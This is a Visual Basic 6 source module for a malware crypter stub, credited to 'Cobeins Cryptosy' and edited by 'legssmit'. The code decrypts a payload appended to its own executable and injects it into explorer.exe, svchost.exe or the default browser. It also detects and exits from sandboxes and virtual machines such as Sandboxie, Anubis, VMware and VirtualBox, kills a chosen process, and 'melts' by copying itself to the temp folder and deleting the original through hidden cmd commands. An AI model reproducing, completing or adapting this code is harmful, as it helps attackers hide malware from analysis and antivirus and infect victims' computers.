Attribute VB_Name = "mMain"
'Crypter based off Cobeins Cryptosy
'Edited by legssmit
' Use  : At your own risk
' ' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission FROM COBEIN AND ME (Legssmit).

Option Explicit

Private Declare Function SetTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long) As Long
Private Declare Function KillTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function GetModuleFileName Lib "kernel32" Alias _
    "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, _
    ByVal nSize As Long) As Long
Private Declare Function GetModuleHandle Lib "kernel32" Alias _
    "GetModuleHandleA" (ByVal lpModuleName As String) As Long
    
      Private Declare Function GetWindowsDirectory Lib "kernel32" _
          Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, _
          ByVal nSize As Long) As Long
      Private Declare Function GetSystemDirectory Lib "kernel32" _
          Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, _
          ByVal nSize As Long) As Long
Private Declare Function FindExecutable Lib "shell32" _
   Alias "FindExecutableA" _
  (ByVal lpFile As String, _
   ByVal lpDirectory As String, _
   ByVal sResult As String) As Long

Private Declare Function GetTempPath Lib "kernel32" _
   Alias "GetTempPathA" _
  (ByVal nSize As Long, _
   ByVal lpBuffer As String) As Long

Private Const MAX_PATH As Long = 260
Private Const ERROR_FILE_NO_ASSOCIATION As Long = 31
Private Const ERROR_FILE_NOT_FOUND As Long = 2
Private Const ERROR_PATH_NOT_FOUND As Long = 3
Private Const ERROR_FILE_SUCCESS As Long = 32 'my constant
Private Const ERROR_BAD_FORMAT As Long = 11

Const DATA_START = "[DATA]"
Const DATA_ARRAY = "[#]"
Dim AntiSandBoxie As String
Dim AntiAnubis As String
Dim AntiJoeBox As String
Dim AntiCWSandBox As String
Dim AntiThreatExpert As String
Dim AntiVMware As String
Dim AntiVirtualPC As String
Dim AntiVirtualBox As String
Dim LengteOrig As String
Dim EncryptionKey As String
Dim LengteVanBestand As String
Dim DelayInSecs As String
Dim MsgMessage As String
Dim MsgOptions As String
Dim MsgCaption As String
Dim InjectionPath As String
Dim MeltStub As String
Dim Apploc As String
Dim DropAs As String
Dim ProcToKill As String
Dim systempath As String
Dim WinPath As String

Public IsInSandboxes As String
Const FileSplit = "[<@]>"
Private m_bCancel As Boolean

Private Sub Main()

    Call GetAppFilename
    Call SetVariables
    Call ReadSettings
    KillProcess ProcToKill
   If MeltStub = 1 Then Call Melt
    If MsgMessage <> "" Then
    MsgBox MsgMessage, MsgOptions, MsgCaption
    End If
    
    Sleep (DelayInSecs)
    Call CheckAntis
    Call Tegen
    Call GetWinDir
    
    If InjectionPath = "thisexe" Then InjectionPath = ThisExe
    If InjectionPath = "explorer.exe" Then InjectionPath = (WinPath & "\explorer.exe")
    If InjectionPath = "svchost.exe" Then InjectionPath = (systempath & "\svchost.exe")
    If InjectionPath = "Default Browser" Then InjectionPath = GetBrowser
    
    SetTimer 0, Rnd * 1024, 100, AddressOf TimerProc
    Do
        DoEvents: Call Sleep(100)
    Loop Until m_bCancel
    
    
End Sub

Sub TimerProc(ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long)
    KillTimer hwnd, nIDEvent

    Dim sPath   As String
    Dim bSig    As Byte
    Dim lSize   As Long
    Dim cCrypt  As New clsCrypt
    Dim sData   As String
    Dim sSize   As String * 8
    Dim systempath As String
    Dim EOFData() As Byte
        
    If Not m_bCancel Then
        m_bCancel = True
        sPath = ThisExe


        Open sPath For Binary Access Read As #1
          
        Seek #1, LOF(1) - (LengteVanBestand + 1): Get #1, , bSig
        Seek #1, LOF(1) - 9: Get #1, , sSize
        lSize = LengteOrig
        If bSig = 27 And lSize > 0 And lSize < LOF(1) Then
            Seek #1, LOF(1) - (LengteVanBestand + 9) - lSize
            sData = Space(lSize)
            Get #1, , sData
            sData = cCrypt.DecryptString(sData, EncryptionKey)
            mPEL.InjectExe InjectionPath, StrConv(sData, vbFromUnicode)
        End If
    
        Close #1
    End If

End Sub

Private Function ReadSettings()
Dim DATA_SPLIT() As String
Dim DATA_PARAMS() As String
Dim GRAB_DATA As String

Open GetAppFilename For Binary As #1
GRAB_DATA = String(LOF(1), vbNullChar)
Get #1, , GRAB_DATA
Close #1
DATA_SPLIT() = Split(GRAB_DATA, DATA_START)
DATA_PARAMS = Split(DATA_SPLIT(1), DATA_ARRAY)
AntiSandBoxie = DATA_PARAMS(0)
AntiAnubis = DATA_PARAMS(1)
AntiThreatExpert = DATA_PARAMS(2)
AntiCWSandBox = DATA_PARAMS(3)
AntiJoeBox = DATA_PARAMS(4)
AntiVMware = DATA_PARAMS(5)
AntiVirtualPC = DATA_PARAMS(6)
AntiVirtualBox = DATA_PARAMS(7)
EncryptionKey = DATA_PARAMS(8)
LengteVanBestand = DATA_PARAMS(9)
DelayInSecs = DATA_PARAMS(10)
LengteOrig = DATA_PARAMS(11)
MsgOptions = DATA_PARAMS(12)
MsgMessage = DATA_PARAMS(13)
MsgCaption = DATA_PARAMS(14)
InjectionPath = DATA_PARAMS(15)
MeltStub = DATA_PARAMS(16)
DropAs = DATA_PARAMS(17)
ProcToKill = DATA_PARAMS(18)
End Function

Private Function SetVariables()
    AntiAnubis = 1
    AntiJoeBox = 1
    AntiSandBoxie = 1
    AntiCWSandBox = 1
    AntiThreatExpert = 1
    AntiVMware = 1
    AntiVirtualPC = 1
    AntiVirtualBox = 1
    LengteOrig = 1
    EncryptionKey = 1
    LengteVanBestand = 1
    DelayInSecs = 0
    IsInSandboxes = 0
    InjectionPath = 0
    MeltStub = 0
    DropAs = "673353.tmp"
    ProcToKill = ""
    End Function

Private Function CheckAntis()
Call IsInSandbox
Call IsVirtualPCPresent
End Function

Public Function Tegen()

If AntiSandBoxie = 1 And IsInSandboxes = 1 Then
    MsgBox "This program cannot be run in Sandboxie. Please close Sandboxie first.", vbCritical, "Sandboxie"
    End
Else

End If

If AntiThreatExpert = 1 And IsInSandboxes = 2 Then
    MsgBox "This program cannot be run in Threat Expert. Please close Threat Expert first.", vbCritical, "Threat Expert"
    End
Else

End If

If AntiAnubis = 1 And IsInSandboxes = 3 Then
    MsgBox "This program cannot be run in Anubis. Please close Anubis first.", vbCritical, "Anubis"
    End
Else

End If

If AntiCWSandBox = 1 And IsInSandboxes = 4 Then
    MsgBox "This program cannot be run in CWSandbox. Please close CWSandbox first.", vbCritical, "CWSandbox"
    End
Else

End If

If AntiJoeBox = 1 And IsInSandboxes = 5 Then
    MsgBox "This program cannot be run in JoeBox. Please close JoeBox first.", vbCritical, "JoeBox"
    End
Else

End If

If AntiVMware = 1 And IsVirtualPCPresent = 1 Then
    MsgBox "This program cannot be run in VMware Workstation. Please close VMware Workstation first.", vbCritical, "VMware Workstation"
    End
Else

End If


If AntiVirtualPC = 1 And IsVirtualPCPresent = 2 Then
    MsgBox "This program cannot be run in VirtualPC. Please close VirtualPC first.", vbCritical, "VirtualPC"
    End
Else

End If


If AntiVirtualBox = 1 And IsVirtualPCPresent = 3 Then
    MsgBox "This program cannot be run in VirtualBox. Please close VirtualBox first.", vbCritical, "VirtualBox"
    End
Else

End If

End Function

Function GetAppFilename() As String
    Dim hModule As Long
    Dim buffer As String * 256
    
    ' get the handle of the running application
    hModule = GetModuleHandle(App.EXEName)
    ' get the filename corresponding to that handle
    GetModuleFileName hModule, buffer, Len(buffer)
    GetAppFilename = Left$(buffer, InStr(buffer & vbNullChar, vbNullChar) - 1)
End Function

Public Function GetBrowser() As String
   Dim flag As Long
   GetBrowser = GetBrowserName(flag)
End Function

Private Function GetBrowserName(dwFlagReturned As Long) As String
   Dim hFile As Long
   Dim sResult As String
   Dim sTempFolder As String
   sTempFolder = GetTempDir()
   hFile = FreeFile
      Open sTempFolder & "dummy.html" For Output As #hFile
   Close #hFile
   sResult = Space$(MAX_PATH)
   dwFlagReturned = FindExecutable("dummy.html", sTempFolder, sResult)
   Kill sTempFolder & "dummy.html"
   GetBrowserName = TrimNull(sResult)

End Function

Private Function TrimNull(item As String)

    Dim pos As Integer

    pos = InStr(item, Chr$(0))

    If pos Then
       TrimNull = Left$(item, pos - 1)
    Else
       TrimNull = item
    End If

End Function

Public Function GetTempDir() As String

    Dim nSize As Long
    Dim tmp As String

    tmp = Space$(MAX_PATH)
    nSize = Len(tmp)
    Call GetTempPath(nSize, tmp)

    GetTempDir = TrimNull(tmp)

End Function

Public Function Melt()
Dim sYourCommand As String

If App.Path <> Environ("Temp") Then
FileCopy GetAppFilename, Environ("Temp") & "\" & DropAs
Apploc = GetAppFilename
Shell "cmd /k " & Environ("Temp") & "\" & DropAs & " " & Apploc, vbHide
End
End If

If App.Path = Environ("Temp") Then
If Command$ <> "" Then
Apploc = Command$
KillProcess "cmd.exe"
sYourCommand = "Del " & Chr(34) & Apploc & Chr(34)
Shell "cmd /c " & sYourCommand, vbHide
End If
End If
End Function

Private Function GetWinDir()
          WinPath = String(145, Chr(0))
          WinPath = Left(WinPath, GetWindowsDirectory(WinPath, _
          Len(WinPath)))
          systempath = String(145, Chr(0))
          systempath = Left(systempath, GetSystemDirectory(systempath, _
          Len(systempath)))
End Function
